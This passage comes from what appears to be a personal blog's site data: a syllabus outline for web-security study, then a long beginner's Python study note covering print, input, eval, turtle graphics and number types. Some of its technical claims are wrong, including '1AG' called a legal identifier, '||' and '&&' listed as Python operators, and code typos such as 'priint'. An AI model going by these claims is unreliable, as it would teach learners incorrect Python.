Web前端 HTML基础 HTML简介与常用标记\nCSS样式 CSS简介\nJavaScript JavaScript简介与常用函数\nWeb后端 PHP基础 PHP简介与安装\nPHP开发环境配置\nPHP基础语法与函数\nPHP循环与流程控制\nPHP表单与Web操作\nPHP文件上传\nPHP类与对象\nPHP魔术方法\nPHPStudy与宝塔\nPython基础 这里有重复，可倒回去看我所发的\u0026quot;Python学习\u0026rsquo;\u0026lsquo;的文章。\nPython基础语法\nPython函数\nPython模块\nPython类与对象\nPython魔术方法\nWeb安全问题 安全事件\nOWASP TOP10\n数据库安全基础 数据库简介 数据库基础概念\n常用数据库与管理工具\nMySql数据库基本操作\n数据库SQL语言 SQL的CRUD（增强改查）\n分组查询、关联查询、子查询\n后端语言SQL操作（PHP）\n数据库安全加固 SQL注入漏洞后门\n数据库加固实操\n","date":"2025-07-31T00:00:00Z","image":"https://expl0rer.top/p/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E5%B0%81%E9%9D%A2_hu_4612687329c10f8d.jpg","permalink":"https://expl0rer.top/p/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/","title":"第一阶段"},{"content":" [TOC]\n前文 Python是强类型的动态脚本语言，相比C、C++来说，它是一种解释型的高级编程语言，能更好跨平台运行，Python的优势在于它能以较短的篇幅完成一项任务，说人话就是敲代码敲得少不费手就能打出脚本，但劣势是运行相对C来说慢些，不过也无妨它成为脚本小子最爱，可以看看下方例子，你就知道差距了哈哈！！！\n我一开始是先学C的，一开始接触编程很坐牢，if、else、for、do while等这些语句把我折磨得很惨，主要是零基础。。。。学完C后又到Python，因为不管打ctf还是以后工作，Python都是比较重要的，所以这也是我为什么要那么啰嗦的把我学Python的过程给记录下来，给未来的自己或者其它读者看看，交流一下也可。我参考嵩天的课本《Python语言程序基础》第二版来讲解，这也不算是讲解吧，更多是我学习的记录，你也看看我的过程，有错误的欢迎在邮箱或者评论区留言指正哈。\n直观例子 C语言 1 2 3 4 5 6 7 #include\u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;Hello! Ct\u0026#34;); return 0; } Python 1 print(\u0026#39;Hello? Ct\u0026#39;) 正文/语法 环境配置 Pycharm + Visual Studio Code\n因为Web网页格式和md文件的问题，再md中的某些符号显示正常，而在博客页面上显示有些异常，但不妨碍阅读，如有显示错误，在不影响答案情况下，都当作正常范围。\nBug的由来 早期美国科学家霍波在调试设备时发现故障，有虫子在机器间飞过从而”卡“住机器运行，于是把程序性故障统称为Bug（飞虫），并把排除程序故障叫做Debug（调试），这也是我们如今计算机领域的专业行话。\n快捷键 撤销：CTRL + z\n复制：CTRL + C\n粘贴：CTRL + v\n查找：CTRL + f\n剪切：CTRL + x\n目录 第一章：程序设计基本方法 计算机的概述 计算机定义有多种，一般是指：计算机是根据指令操作数据的设备。\n计算机的两个基本特性：功能性和可编程性。 功能性指对数据的操作，表现为数据计算、输出输入处理和结果存储等。 可编程性指它可以根据一系列指令自动地、可预测地、准确地完成操作者的意图。\n程序设计语言 程序设计语言概述 程序设计语言是计算机能够理解和识别用户操作意图的一种交互体系，它按照特定规则组织计算机指令，使计算机能够自动进行各种运算处理。 简单地说就是我用机器的语言去告诉这个计算机我想干的，要这个计算机去完成，”交互“其实就类似交流互动的意思。\n程序设计语言包括3个大类：机器语言、汇编语言和高级语言。 机器语言是一种二进制语言，它直接使用二进制代码表达指令，是计算机硬件可以直接识别和执行的程序设计语言。例如，执行数字2和3的加法，16位计算机上的机器指令为：11010010 00111011，不同计算机结构的机器指令不同。\n直接使用机器语言编写程序十分繁冗，同时，二进制代码编写的程序难以阅读和修改，因此，汇编语言诞生了，它使用助记符与机器语言中的指令进行一一对应，在计算机发展早期能帮助程序员提高编程效率。例如，执行数字2和3的加法，汇编语言指令为：add 2, 3, result，运算结果写入 result。与机器语言类似，不同计算机结构的汇编指令不同。由于机器语言和汇编语言都直接操作计算机硬件并基于此设计，所以它们统称为 低级语言 。\n高级语言与低级语言的区别在于，高级语言 是接近自然语言的一种计算机程序设计语言，例如python和C语言、Java、html之类，这些可以更容易地描述协算问题并利用计算机解决计算问题。例如，执行数字2和3加法，高级语言代码为：result=2+3，这个代码只与编程语言有关，与计算机结构无关，同一种编程语言在不同计算机上的表达方式是一致的。\n编程语言分为两类：通用编程语言、专用编程语言 一般来说，通用编程语言比专用于某些领域的编程语言生命力更强。如HTML语言则是一个专用编程语言，应用在网络前端。它利用超链接将文本、图像、音/视频等资源组织起来形成 Web页面。像python就是通用型的了，能应用在多领域。\n如果能像科幻电影中的情节一样，用人类语言驱动计算机将是最完美的事情。\n遗憾的是，尽管许多一流科学家为此做过很多努力，仍然无法在可预见的未来设计出能完全理解人类语言的计算机。\n编译与解释 高级语言按照计算机执行方式的不同可分成两类：静态语言和脚本语言。这里所说的执行方式是指计算机执行一个程序的过程，静态语言采用编译执行，脚本语言采用解释执行。无论哪种执行方式，用户的使用方法可以是一致的，如通过鼠标双击执行一个程序。\n编译是将源代码转换成目标代码的过程，通常，源代码是高级语言代码，目标代码是机器语言代码，执行编译的计算机程序称为编译器（Compiler)。如图1.1展示了程序的编译过程，其中，虚线表示目标代码被计算机运行。编译器将源代码转换成目标代码，计算机可以立即或稍后运行这个目标代码。\n解释是将源代码逐条转换成目标代码同时逐条运行目标代码的过程。执行解释的计算机程序称为解释器（Interpreter)。如图1.2展示了程序的解释过程。其中，高级语言源代码与数据一同输入给解释器，然后输出运行结果。\n解释和编译的区别在于编译是一次性地翻译，一旦程序被编译，不再需要编译程序或者源代码。解释则在每次程序运行时都需要解释器和源代码。这两者的区别类似于外语资料的翻译和实时的同声传译。\n编译过程只进行一次，所以，编译过程的速度并不是关键，目标代码的运行速度是关键。因此，编译器一般都集成尽可能多的优化技术，使生成的目标代码具备更好的执行效率。然而，解释器却不能集成太多优化技术，因为代码优化技术会消耗运行事件，使整个程序的执行速度收到影响。\n采用编译方式有如下好处：\n（1）对于相同源代码，编译所产生的目标代码执行速度更快。\n（2）目标代码不需要编译器就可以运行，在同类型操作系统上使用灵活。\n采用解释方式有如下好处：\n（1）解释执行需要保留源代码，程序纠错和维护十分方便。在\n（2）只要存在解释器，源代码可以在任何操作系统上运行，可移植性好。\nPython语言概述 Python语言的发展 Python语言诞生于 1990年，由Guido van Rossum 设计并领导开发。1989年12月，Guido考虑启动一个开发项目以打发圣诞节前后的时间，所以决定为当时正在构思的一个新的脚本语言写一个解释器，因此在次年诞生了Python 语言。该语言以“Python”命名源于Guido对当时一部英剧“Monty Python\u0026rsquo;s Flying Circus”的极大兴趣。也许 Python 语言的诞生是个偶然事件，但20多年持续不断的发展将这个偶然事件变成了计算机技术发爆过程中的一件大事。\nPython语言是开源项目的优秀代表，其解释器的全部代码都是开源的，可以在Python语言的主网站(https://www.python.org/)自由下载。\n\u0026ldquo;Python 2.x 已经是遗产，Python 3.x 是这个语言的现在和未来\u0026rdquo;\n编写Hello程序 结构简单很多，比C简单：\n1 print(\u0026#34;Hello World\u0026#34;) Python语言的Hello程序似乎与人类语言类似，即通过一行语句就完成了输出一段文本的任务。其它编程语言的Hello程序并不这样简洁，如下是C语言的Hello程序，对比。\n1 2 3 4 5 6 #include\u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;Hello World\\n\u0026#34;); return 0; } C语言程序除了向屏幕输出“Hello World”的printf语句外，还包含了include、int、main、printf、return等其他辅助元素，这里就不具体介绍了。这个最小的例子只是一个缩影，Python 的简洁性在编程语言领域是公认的。同样功能的程序，Python语言实现的代码行数仅相当于C语言的1/10～1/5(其简洁程度取决于程序的复杂度和规模)。更少的代码行数、更简洁的表达方式将带来更少的程序错误、更快的程序开发速度和更好的可读性。这也是为什么很多CTF及其他行业的自动化脚本都是用Python来编写的重要原因之一。\nPython语言的特点 这里不按照书上那样的繁琐，我简洁说明：\n（1）语法简洁\n（2）与平台无关：作为脚本语言，Python 程序可以在任何安装解释器的计算机环境中执行，因此，用该语言编写的程序可以不经修改地实现跨平台运行。\n（3）粘性扩展：Python 语言具有优异的扩展性，体现在它可以集成C、C++、Java 等语言编写的代码，通过接口和函数库等方式将它们“粘起来”（整合在一起)。此外，Python 语言本身提供了良好的语法和执行扩展接口，能够整合各类程序代码。\n（4）开源理念\n（5）通用灵活\nPython语言开发环境配置 安装Python解释器 略，这里我不写的原因是Pycharm、vscode等的编程软件更新迭代较快，时间有限，来不及更改，而且这类安装教程这一块可以去BiliBili、CSDN去找教程，都很详细的。\n运行程序 运行Python 程序有两种方式：交互式和文件式。交互式指 Python 解释器即时响应用户输入的每条代码，给出输出结果。文件式，也称为批量式，指用户将Python程序写在一个或多个文件中，然后启动Python解释器批量执行文件中的代码。\n交互式一般用于调试少量代码，文件式则是最常用的编程方式。 其他编程语言通常只有文件式执行方式。\n下面以 Windows操作系统中运行 Hello程序为例具体说明两种方式的启动和执行方法。 1，交互式启动和运行方法\n交互式有两种启动和运行方法。 第一种方法，启动Windows操作系统命令行工具（\u0026lt;Windows系统安装目录\u0026gt;\\system32\\cmd.exe)，在控制台中输入“Python\u0026quot;，在命令提示符\u0026raquo;\u0026gt;后输入如下程序代码：\n1 print(\u0026#34;Hello World\u0026#34;) 1、交互式：多行代码难以运行 2、文件式：多代码运行\n运行Python程序 这里开始逐渐上强度了，我是先敲一敲Python代码，去运行一下，熟悉下它的逻辑原理，\n1、圆面积的计算：\n1 2 radius = 25 #圆的半径是25 area = 3.1415 * radius * radius #输入计算圆面积的公式print(area) 1963.4375000000002\n1 print(\u0026#34;{:.2f}\u0026#34;.format(area)) #只输出两位小数 1963.44\n2、简单人名对话：\n1 name = input(\u0026#34;输入姓名：\u0026#34;） 输入姓名：MISC\n1 print(\u0026#34;{}大佬，学好CTF，前途无量！\u0026#34;.format(name）） MISC大佬，学好CTF，前途无量！\n1 print(\u0026#34;{}大侠，学好CTF，大展拳脚！\u0026#34;.format(name[0])） MISC大侠，学好CTF，大展拳脚！\n1 print(\u0026#34;{}哥哥，学好Python，人见人爱！\u0026#34;.format(name[1:])） MISC哥哥，学好CTF，人见人爱！\n3、斐波那契数列的计算：根据斐波那契数列的定义，输出不大于1000的序列元素。交互式执行过程。\n1 2 3 4 a, b = 0, 1 while a \u0026lt; 1000: # 输出不大于1000的序列 print(a, end= \u0026#39;,\u0026#39;) a, b = b, a + b 4、同切圆的绘制\n1 2 3 4 5 6 import turtle #引用turtle库 turtle.pensize(2) #设置画笔宽度为2像素 turtle.circle(10) #绘制半径为10像素的画 turtle.circle(40) turtle.circle(80) turtle.circle(160) 如下： ”Python的魅力远不只如此“\n5、日期和时间的输出。 输出当前计算机的系统日期和时间。\n1 2 3 4 5 from datetime import datetime # 引用 datetime库 now = datetime.now() #获得当前日期和时间信息 print (now) now.strEtime(\u0026#34;%x\u0026#34;) #输出其中的日期部分 now.strftime(\u0026#34;%X\u0026#34;) #输出其中的时间部分 程序基本编写 IPO（Input, Process, Output)\n输入（Input）是一个程序的开始。程序要处理的数据有多种来源，因此形成了多种输入方式，包括文件输入、网络输入、控制台输入、交互界面输入、随机数据输入、内部参数输入等。\n（1）文件输入：将文件作为程序输入来源。在获得文件控制权后，需要根据文件格式解析内部具体数据。例如，统计Excel文件数据的数量，需要首先获得Excel文件的控制权，打开文件后根据 Excel 中数据存储方式获得所需处理的数据，进而开展计算。7.1 节将具体介绍文件的使用。\n（2）网络输入：将互联网上的数据作为输入来源。使用网络数据需要明确网络协议和特定的网络接口。例如，捕获并处理互联网上的数据，需要使用协议 HTTP并解析 HTML 格式。第10章将介绍网络爬虫的原理和方法。\n（3）控制台输入：将程序使用者输入的信息作为输入来源。当程序与用户间存在交互时，程序需要有明确的用户提示，辅助用户正确输入数据。从程序语法来说，这种提示不是必需的，但良好的提示设计有助于提高用户体验。（比较常用）\n（4）交互界面输入：通过提供一个图形交互界面从用户处获得输入来源。此时，鼠标移动或单|双击操作、文本框内的键盘操作等都为程序提供输入的方式。\n（5）随机数据输入：将随机数作为程序输入，这需要使用特定的随机数生成器程序或调用相关函数。4.5 节将详细介绍产生随机数的方法。\n（6）内部参数输入：以程序内部定义的初始化变量为输入，尽管程序看似没有从外部获得输入，但程序执行之前的初始化过程为程序赋予了执行所需的数据。\n输出(Output)是程序展示运算成果的方式。程序的输出方式包括控制台输出、图形输出、文件输出、网络输出、操作系统内部变量输出等。 （（1）（2）（3）比较常用）\n（1）控制台输出：以计算机屏幕为输出目标，通过程序运行环境中的命令行打印输出结果。这里“控制台”可以理解为启动程序的环境，例如，Windows中的命令行工具、IDLE工具等。\n（2）图形输出：在计算机中启动独立的图形输出窗口，根据指令绘制运算结果。\n（3）文件输出：以生成新的文件或修改已有文件方式输出运行结果，这是程序常用的输出方式。\n（4）网络输出：以访问网络接口方式输出数据。第10章将介绍自动向搜索引擎提交关键词查询的实例。\n（5）操作系统内部变量输出：指程序将运行结果输出到系统内部变量中，这类变量包括管道、线程、信号量等。\n处理（Process）是程序对输入数据进行计算产生输出结果的过程。计算问题的处理方法统称为“算法”，它是程序最重要的组成部分。可以说，算法是一个程序的灵魂。算法处理比较重要，在章节后续单独讲解。\nPython语言的迭代 版本区别 为什么Python 2”过时“了还要有人去学？在我网安学习期间，用到Kali Linux系统虚拟机，配置一些命令行工具时，有些经典脚本都是基于python2开发的 ，所以只能再给kali配置个python2和3的虚拟环境，才能用，在如今有些企业的系统产品有些也是基于python2开发的，在打补丁和维护升级时也需要用到python2，所以得对python2.x 基本了解，熟悉python3.x 。\n\u0026ldquo;Python 2.x已经是遗产，Python 3.x是这个语言的现在和未来。\u0026rdquo;\n2010年，Python 2.x系列发布了最后一个版本，其主版本号为2.7，同时，Python维护者们声称不在2.x系列中继续进行主版本号升级。Python 2.x系列已经完成了它的使命，逐步退出历史舞台。\n2008年，Python 3.x第一个主版本发布，其主版本号为3.0，并作为Python语言持续维护的主要系列。该系列在2012年推出3.3 版本,2014年推出3.4版本，2015年推出3.5 版本，2016年推出3.6 版本。目前，主要的Python 标准库更新只针对 3.x系列。\nPython 3.x 是 Python 语言的一次重大升级，它不完全向下兼容2.x系列程序。在语法层面，3.x系列继承了2.x系列绝大多数的语法表达，只是移除了部分混淆的表达方式。对于程序设计初学者来说，两者的差距很小，学会3.x系列也能看懂2.x。\n（1）修改编码：3.x系列默认采用UTF-8编码，因此处理中文与英文一样方便。 而且，在表达UTF-8编码字符串时，不需要在前面增加u或者U。 （2）修改print 语句：用print)函数替换了 print 语句，两者功能一样，格式不同：\n1 2 3 4 2.x: \u0026gt;\u0026gt;\u0026gt;print \u0026#34;The answer is\u0026#34;, 2 * 2 3.x: \u0026gt;\u0026gt;\u0026gt;print(\u0026#34;The answer is\u0026#34;, 2 * 2） 2.x: \u0026gt;\u0026gt;\u0026gt;print x， 3.x: \u0026gt;\u0026gt;\u0026gt;print(x, end=\u0026#34;,\u0026#34;） （3）修改exec语句:用exec()函数替换了 exec 语句，两者功能一样，格式不同。\n（4）去掉一符号：用!=表示“不等于”。\n（5）修改比较行为：用\u0026lt;、\u0026lt;=、\u0026gt;=、\u0026gt;符号比较两个元素时，如果元素之间不存在有意义的顺序关系，将抛出TypeError错误，不再返回 False。\n第二章：Python程序实例解析 Python语法规则 Python格式框架 Python语言采用严格的“缩进”来表明程序的格式框架，在符号“ ： ”下一行就需要缩进了，缩进用处是决定代码块的从属关系，说人话就是，比如if语句下一行开始，缩进相同的代码都是属于if旗下的，这好处是更加简洁。当然过C语言也知道。\n注释用语 注释用词是#、‘’‘、“”“ ”“”。\n1 2 3 4 5 6 7 8 9 10 11 12 13 print(\u0026#39;信不信？只能输出我这行字？\u0026#39;) #单行注释 #print(\u0026#39;666\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 我是 多 行 注释 print(\u0026#39;nihao\u0026#39;) \u0026#39;\u0026#39;\u0026#39; \u0026#34;\u0026#34;\u0026#34; 也是一样的效果，三对双单引号都可，只要是英文键就好 \u0026#34;\u0026#34;\u0026#34; 命名与保留字 与数学概念类似，Python 程序采用“变量”来保存和表示具体的数据值。为了更好地使用变量等其他程序元素，需要给它们关联一个标识符（名字)，关联标识符的过程称为命名。命名用于保证程序元素的唯一性。例如，实例代码 1.1中，TempStr是一个接收输入字符串的变量名字。 Python 语言允许采用大写字母、小写字母、数字、下画线 和汉字等字符及其组合给变量命名，但名字的首字符不能是数字，中间不能出现空格，长度没有限制。以下是合法命名的标识符：\npython_is_good、python_is_not_good、is_it_a_question、1AG\n除此之外，命名还不能和Python自带的专用词重名：\n字符串 字符串是字符的序列，可以按照单个字符或字符片段进行索引。字符串包括两号体系：正向递增序号和反向递减序号，如图所示。如果字符串长度为L，递增以最左侧字符序号为0,向右依次递增，最右侧字符序号为L-1；反向递减以最右侧字符序号为-1，向左依次递减，最左侧字符序号为-L。这两种索引字方法可以同时使用。实例代码1.1 中第3行 TempStr[-1]表示字符串TempStr变最后一个字符。\na[0:3]就表示从第0个到第3个的前一个也就是0、1、2，所以没有”h“。\n赋值语句 学过C语言就直接秒过懂了。\n单一赋值：\n1 2 3 4 5 t = x x = y y = t 同步赋值、一一对应：\n1 x, y = y, x input() 函数 也是很简单，类似C语言的scanf语句之类的，不同于C语言，这个input函数还有类似C的printf语句和scanf的作用，输出的同时还有输入作用。类比起来如下：\n1 input (\u0026#34;请输入\u0026#34;) 1 2 3 4 5 6 7 #include\u0026lt;stdio.h\u0026gt; int main(void) { printf(\u0026#34;请输入\u0026#34;); scanf(\u0026#34;D\u0026#34;,\u0026amp;d); return 0; } 说人话就是一个python的input能同时等效C语言的printf和scanf。\n分支语句 if、elif、else这个字面意思翻译就好：\nif \u0026lt;条件1\u0026gt;\n​ \u0026lt;语句1\u0026gt;\nelif \u0026lt;条件2\u0026gt;\n​ \u0026lt;语句2\u0026gt;\n\u0026hellip;\u0026hellip;..N\u0026hellip;\u0026hellip;\nelse:\n​ \u0026lt;语句块N\u0026gt;\n理解来说，先从条件一开始判断，如果不满足第一个条件if，就跳到下一个条件elif上，不满足再接着下一个，直到最后一个条件else为止。当然编代码时，只有两个条件时只保留if和else。\nprint() 函数 print很像我们当今的用词“Say”，说话，输入你要说的，计算机就帮你说出来，print(\u0026lt;字符串\u0026gt;)在里面就是要说的，可以是字符串、数字等去输出变量。当输出变量值时，需要采用格式化输出方式，这需通过format()方法将待输出变量整理成期望输出的格式，（.format(F) 表示用变量 F 的值来替换前面的占位符）如：\n1 2 3 4 5 6 C1, C2 = 10, 10.24024 print (\u0026#34;转换后的温度是{:.2f}C\u0026#34;.format(C1)) #f 表示要格式化的数据是浮点数（小数）； .3 表示保留 3 位小数 print (\u0026#34;转换后的温度是{:.3f}C\u0026#34;.format(C2)) print (\u0026#34;输出格式错误\u0026#34;) 转换之后的温度是10.00C 转换之后的温度是10.240C\neval() 函数 eval函数很类似print，但不单纯是print的输出作用，，它能够以Python表达式的方式解析并执行字符串，并将返回结果，再由print去输出最终结果。例如：\n1 2 3 4 5 6 x = 1 print(eval(\u0026#34;x+1\u0026#34;)) #或者 x = 1 value = eval(\u0026#34;x+1\u0026#34;) print(value) 2\n1 2 x = 1 eval(\u0026#34;x + 1\u0026#34;) 无输出结果\n当然，eval还能这样用：\n1 2 value = eval(input(\u0026#34;请输入要计算的数值：\u0026#34;)) print(value*2) 。。。。。。\n循环语句 顾名思义就是在满足条件下去循环运行：\nwhile (\u0026lt;条件\u0026gt;): \u0026lt;语句块1\u0026gt; \u0026lt;语句2\u0026gt;\n当条件为真（true）时，执行语句块1语句，这些语句通过缩进表达与while语句的所属关系。当条件为假（false），退出循环，执行循环后语句块2语句，以此类推。\n以下实例使用了条件循环，该循环条件用于判断用户输入的最后一个字符（TempStr[-1]）是否为’N‘或’n‘。\n1 while TempStr[-1] not in [\u0026#39;N\u0026#39;,\u0026#39;n\u0026#39;]: 如果该字符是\u0026rsquo;N\u0026rsquo;或者\u0026rsquo;n\u0026rsquo;，则条件语句结果为false，退出循环，进而结束程序；否则条件语句结果为true，继续执行循环内部语句。这行语句中的not是保留字，表示对判断结果取反。后续章节对循环语句详细讨论。\nfor i in range(\u0026lt;循环次数\u0026gt;):\n​ \u0026lt;语句块1\u0026gt;\nPython模块-库的引用 先放预告片。。。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #e2.1DrawPython.py import turtle turtle.setup(650, 350, 200, 200) turtle.penup() turtle.fd(-250) turtle.pendown() turtle.pensize(25) turtle.pencolor(\u0026#34;purple\u0026#34;) turtle.seth(-40) for i in range(4): turtle.circle(40, 80) turtle.circle(-40, 80) turtle.circle(40, 80/2) turtle.fd(40) turtle.circle(16, 180) turtle.fd(40 * 2/3) 可以先运行下这代码。接下来都将围绕这段代码的各个函数进行拆解分析。\n库的引用 何为“库”？就是仓库的意思，没想到吧？Python语言还有仓库？就是解决更多问题的工具库，比如说math库、turtle库等，看字面意思就知道，math肯定和数学有关的，事实上确实如此。如果你在编Python语言时，想绘制sin函数的平面坐标图，直接写sin就发现Python它压根不认识这东西，这时你就需要引用math库去找里面你要的“工具”，表示出sin函数的编码，然后再引用turtle库去画图，两者一结合，熟悉的sin波浪线图就出来啦！！\n我们可以用import来引用库，如\n1 2 3 import math #导入 a = math.sin(3) #调用math库中的sin函数 priint(a) 当然也可以用from \u0026lt;库名\u0026gt; import \u0026lt;函数名，函数名，\u0026hellip;\u0026hellip;..，函数名\u0026gt; 以及from \u0026lt;库名\u0026gt; import *（*表示通配符，把库所有函数都调用），如果全部调用的话，那就直接写对应函数就好，不用写math.xxx，而是直接写xxx函数\n有关库的章节讨论放在后续。\nturtle库语法的引用 turtle（海龟）是一个直观有趣的的图形绘制函数库，所以说turtle比较重要，单独细讲。在这里我仅举几例：\n绘图坐标体系 turtle库绘制有一个基本的结构框架：一个小乌龟在坐标系中爬行，其爬行轨迹形状形成了绘制图形。对于小海龟来说，有”前进“、”后退“、”旋转“等爬行行为，跟游戏一样有一个前、后、左、右方向键，刚开始时小海龟在原点（0，0），行进方向为水平右方。 width：窗口宽度，如果值是整数，表示像素值：如果值是小数，表示窗口宽度与屏幕的比例。\nheight：窗口高度，如果值是整数，表示像素值；如果值是小数，表示窗口高度与屏幕的比例。\nstartx：窗口左侧与屏幕左侧的像素距离，如果值是 None，窗口位于屏幕水平中央。\nstarty：窗口顶部与屏幕顶部的像素距离，如果值是 None，窗口位于屏幕垂直中央。\n上图的预告片代码中就有这个setup函数，可以看到已经设定好窗口大小参数的。\n画笔控制函数 turtle.penup ()和 turtle.pendown ()函数，顾名思义，这俩家伙就是“笔”，上图的预告片的代码就有这俩函数。（这俩函数还有简称，分别是turtle.up和turtle.down或者turtle.pu和turtle.pd，在此了解下就好，还是全名可读性强些）\npenup函数和pendown函数按照字面意思易知，它们分别表示抬起画笔和落下画笔:\npenup函数会抬起画笔后，这时程序再让画笔移动是绘制不出形状的，需要pendown落下画笔才可绘制，毕竟penup相当于在空中抬笔这时候画画又能画出啥呢？\nturtle.pensize() 函数，别名：turtle.width()，就是控制画笔的粗度，例如pensize(25)表示25宽度的笔。\npensize函数的变量（）为无/none的话，则函数返回当前画笔的宽度。\nturtle.pencolor() 函数给画笔设置颜色，可以看看预告片的编码画出一条紫色小蛇，括号里可以是表示颜色的字符串，例如，”purple、blue“等；也可以是颜色对应的RGB数值，例如，（51, 204, 140）。\n英文名称 RGB 十六进制 中文名称 white 255 255 255 #FFFFFF 白色 black 0 0 0 #000000 黑色 grey 190 190 190 #BEBEBE 灰色 darkgreen 0 100 0 #006400 深绿色 gold 255 215 0 #FFD700 金色 violet 238 130 238 #EE82EE 紫罗兰色 purple 160 32 240 #A020F0 紫色 RGB颜色是计算机系统最常用的颜色体系之一，它采用R(红色）、G(绿色）、B（蓝色）3种基本颜色及它们的叠加组成各式各样的颜色，构成颜色体系。RGB颜色诞生于19 世纪中期、计算机产生之前，理论表明，RGB颜色能够形成人眼感知的所有颜色。 具体来说，RGB颜色采用（r,g,b）表示，其中，每个颜色采用8bit表示，取值范围是[0, 255]。因此，RGB颜色一共可以表示256（16 M，约1678万）。\n形状绘制函数 turtle.fd() 函数，全名turtle.forward() 函数，通过一组函数控制画笔的行进动作，进而绘制出形状。turtle.fd(distance) 表示向小海龟当前行进方向前进distance单位距离，值为负数就反方向走。\nturtle.seth() 函数，别名turtle.setheading (to_angle)，设置小海龟当前的行进方向，该角度为绝对方向的角度值。\nto_angle：角度的整数值。\nfor循环语句和turtle.circle() 函数\n1 2 3 4 5 for i in range (4): turtle.circle(40, 80) turtle.circle(-40, 80) turtle.circle(40, 80/2) turtle.circle(16, 180) turtle.circle(radius, extent=None)\n作用：根据半径radius绘制extent角度的弧形。\nradius：弧形半径，当值为正数时，半径在小海龟左侧，当值为负数，半径在小海龟右侧。\nextent：绘制弧形的弧度，当不设置弧度时默认”None“。\n以上就是个别例子，还有很多turtle 库函数的详细用法最好都了解下，因为比较基础，养成引用库的好习惯。\n第三章：Python语言的常规应用 数字类型 表示数字或数值的数据类型称为数字类型，Python语言提供3种数字类型：整数、浮点数和复数，分别对应数学中的整数、实数和复数。\n注意：1010表示一个整数，‘’1010”表示一个字符串。\n数字类型的正确运用能提高数字运算效率，同时具备较少的存储空间代价。整数和带有小数的数字分别由计算机中央处理器中不同的硬件逻辑操作，对于相同类型操作，如整数加法和小数加法，前者比后者的速度一般快5~20倍。\n整数类型 整数类型与数学中整数的概念一致，下面是整数类型的例子： 1010.99，-217，0x9a，-0×898\n整数类型共有4种进制表示：十进制、二进制、八进制和十六进制。默认情况，整数采用十进制，其他进制需要增加引导符号，如表3.1所示。二进制数以0b 引导，八进制数以0o引导，十六进制数以0x引导，大小写字母均可使用。\n进制种类 引导符号 描述 十进制 无 默认情况,例如,1010.-425 二进制 0b或0B 由字符0和1组成，例如，0b101,0B101 八进制 0o或0O 由字符0到7组成，例如00711,00711 十六进制 ox或0X 由字符0到9、a到f、A到F组成，例如，OxABC 整数类型理论上取值正负无穷，但现实是受运行Python程序的计算机内存大小。\n浮点数类型 浮点数类型与数学中实数的概念一致，表示带有小数的数值。Python语言要求所有浮点数必须带有小数部分，小数部分可以是 0，这种设计可以区分浮点数和整数类型。浮点数有两种表示方法：十进制表示和科学计数法表示。下面是浮点数类型的例子：0.0、-77. 、-2.17、3.1416、96e4、4.3e-3、9.6E5。当然，4.3e-3值为0.004.3、9.6E5也可以表示为9.6E+5。\n科学计数法使用字母e或E作为幂的符号，以10为基数，含义如下： $$ aeb = a*10^b $$ Python 浮点数的数值范围和小数精度受不同计算机系统的限制，sys.float_info详细列出了Python 解释器所运行系统的浮点数各项参数，例如：\n1 2 3 4 import sys sys.float_info sys.float_info.max sys.float_info (max=1.7976931348623157e+308, max_exp=1024, max_10_exp=308, min=2.2250738585072014e-308, min _exp=-1021, min_10_exp=-307, dig=15, mant_dig=53, epsilon=2.220446049250313e-16, radix=2, rounds=1)\n1.7976931348623157e+308\n关于浮点数的精度问题 浮点数在超过15位数字计算中产生的误差与计算机内部采用二进制运算有关，使用浮点数无法进行极高精度的数学运算。\n由于Python语言能够支持无限制且准确的整数计算，因此，如果希望获得精度更高的计算结果，往往采用整数而不直接采用浮点数。例如，计算如下两个数的乘法值，它们的长度只有10个数字，其中：\na=3.141592653， b=1.2345678\n1 2 3.141592653*1.2345678 3141592653*12345678 #去掉小数点 3.8785094379864535\n3878509437986453394\n到此为止，你可以很清楚看到确实有误差，一切归根到底是计算机内部底层基础的差异造成的，毕竟计算到15位小数相同，这个误差已经很小了，这个精度在现实生活中已能够应对绝大多数的计算研究了。\n复数类型 复数类型表示数学中的复数。这个大家应该都很熟悉： $$ x^2=-1 $$ 复数可以看作是二元有序实数对(a,b)，表示为a+i，其中，a是实数部分，简称实部，b是虚数部分，简称虚部。根据图3.1，复数是实数在二维平面空间旋转的一和麦示。\nPython语言中，复数的虚数部分通过后缀“i”或“j”来表示，例如：12.3+4j、-5.6+7j、1.23e-4+5.67e+89j\n复数类型中实数部分和虚数部分的数值都是浮点类型。对于复数z,可以用z.real和z.imag 分别获得它的实数部分和虚数部分，例如：\n1 2 1.23e-4+5.67e+89j.real #实部 1.23e-4+5.67e+89j.imag #虚部 0.000123\n5.67e+89\n复数类型在科学计算中十分常见，基于复数的运算属于数学的复变函数分支，该分支有效支撑了众多科学和工程问题的数学表示和求解。Python 直接支持复数类型，为这类运算求解提供了便利。\nBool类型（补充） Bool数类型只有True、False这两种，在Python中Bool比较特殊，在这里需要着重了解下特性就好，在Python或者C中，True或者False很大程度上用来作判断条件语句的一部分的，学过C语言的都知道：true和false分别可用1、0表示，也可以说是等价关系。那类比到Python中则是一样的，但特性在于：\n1 2 a = True + 10 #a = 1 + 10 print(a) 11\n对于False也是一样，这里不详细讲解，只要知道有这个特性就好，毕竟Bool类型是归类到整数类型之下的。\n数字类型的操作 内置的数值运算操作符 Python提供了9个基本的数值运算操作符，如下所示。这些操作符由Python解释器直接提供，不需要引用标准或第三方函数库，也叫做内置操作符。\n操作符 描述 || “或”的意思，比如a = 3 x + y x与y之和 x - y x与y之差 x * y x与y之积 x / y x与y之商 x // y x与y之整数商，即不大于×与y之商的最大整数 x % y x与y之商的余数。也称为模运算 -x x的负值即x*(-1） \u0026amp;\u0026amp; ”和“的意思，比如a = 3\u0026amp;\u0026amp;b = 2，意思是a=3的同时b还要为2 x**y x的y次幂，即x的y次方 